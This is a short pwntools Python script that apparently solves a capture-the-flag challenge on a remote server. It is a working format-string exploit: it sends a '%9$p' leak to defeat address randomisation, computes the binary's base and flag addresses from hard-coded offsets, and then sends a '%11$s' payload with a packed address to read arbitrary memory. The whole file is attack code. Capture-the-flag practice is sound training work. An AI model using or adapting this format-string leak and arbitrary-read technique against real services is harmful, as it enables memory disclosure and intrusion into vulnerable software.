from pwn import *

conn = remote('chal.sigpwny.com', 1383)

conn.sendlineafter(b"What is your name? ", b"%9$p")
conn.recvuntil(b"Hello ")
# remove trailing exclamation point
LEAK = int(conn.recvline()[:-2], 16)
# print(f"leak: {hex(LEAK)}")

# get base address of binary
BASE_ADDR = LEAK - 0x13bf # offset found using stack reads/last 3 digits of leak and objdump
# print(f"base address: {hex(BASE_ADDR)}")

# get address of flag
FLAG_ADDR = BASE_ADDR + 0x4060
# print(f"flag address: {hex(FLAG_ADDR)}")

# arbitrary read at flag address
exploit = b''
exploit = b'%11$s___'
exploit += p64(FLAG_ADDR)

conn.sendlineafter(b"What is your name? ", exploit)
print(conn.recvuntil(b'\n'))

conn.interactive()